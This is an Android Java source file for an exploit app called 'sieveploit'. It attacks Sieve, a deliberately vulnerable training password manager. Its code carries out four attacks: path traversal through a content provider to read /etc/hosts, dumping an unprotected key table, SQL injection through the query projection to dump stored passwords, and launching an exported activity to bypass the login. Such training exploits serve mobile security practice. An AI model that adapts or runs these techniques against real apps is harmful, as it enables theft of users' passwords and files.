package com.cakmin.sieveploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.database.DatabaseUtils;
import android.net.Uri;
import android.widget.AdapterView;
import android.view.View;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.AdapterView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;

// Main Activity implements Adapter view
public class MainActivity extends AppCompatActivity implements AdapterView.OnItemSelectedListener {

    // create array of Strings
    // and store name of courses
    String[] xploit_type = { "SieveDT", "SieveLeak", "SieveSQLI", "SieveBypass" };
    int positonInt=0;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Take the instance of Spinner and
        // apply OnItemSelectedListener on it which
        // tells which item of spinner is clicked
        Spinner spino = findViewById(R.id.spinner);
        spino.setOnItemSelectedListener(this);

        // Create the instance of ArrayAdapter
        // having the list of courses
        ArrayAdapter ad = new ArrayAdapter(this, android.R.layout.simple_spinner_item, xploit_type);

        // set simple layout resource file
        // for each item of spinner
        ad.setDropDownViewResource( android.R.layout.simple_spinner_dropdown_item);

        // Set the ArrayAdapter (ad) data on the
        // Spinner which binds data to spinner
        spino.setAdapter(ad);
    }

    @Override
    public void onItemSelected(AdapterView<?> adapterView, View view, int position, long l) {
//        Toast.makeText(getApplicationContext(),xploit_type[position],Toast.LENGTH_LONG).show();
        String item_position = String.valueOf(position);
        positonInt = Integer.valueOf(item_position);
//        Toast.makeText(getApplicationContext(),String.valueOf(position),Toast.LENGTH_LONG).show();
    }

    @Override
    public void onNothingSelected(AdapterView<?> adapterView) {

    }

    public void sendMessage(View view) {
        EditText textresult = (EditText) findViewById(R.id.txtlogData);
        textresult.setText("");
        switch(positonInt) {
            case 0:
                try {
                    BufferedReader reader1 = new BufferedReader(new InputStreamReader(getContentResolver().openInputStream(Uri.parse("content://com.mwr.example.sieve.FileBackupProvider/etc/hosts"))));
                    while (true) {
                        String line1 = reader1.readLine();
                        if (line1 != null) {
                            textresult.append(line1);
                        } else {
                            return;
                        }
                    }
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } catch (IOException e2) {
                    e2.printStackTrace();
                }
                break;
            case 1:
                textresult.setText(DatabaseUtils.dumpCursorToString(getContentResolver().query(Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys/"), null, null, null, null)));
                break;
            case 2:
                textresult.setText(DatabaseUtils.dumpCursorToString(getContentResolver().query(Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys/"), new String[]{"* FROM Passwords;"}, null, null, null)));
                break;
            default:
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.mwr.example.sieve", "com.mwr.example.sieve.PWList"));
                startActivity(intent);
                break;
        }
    }

}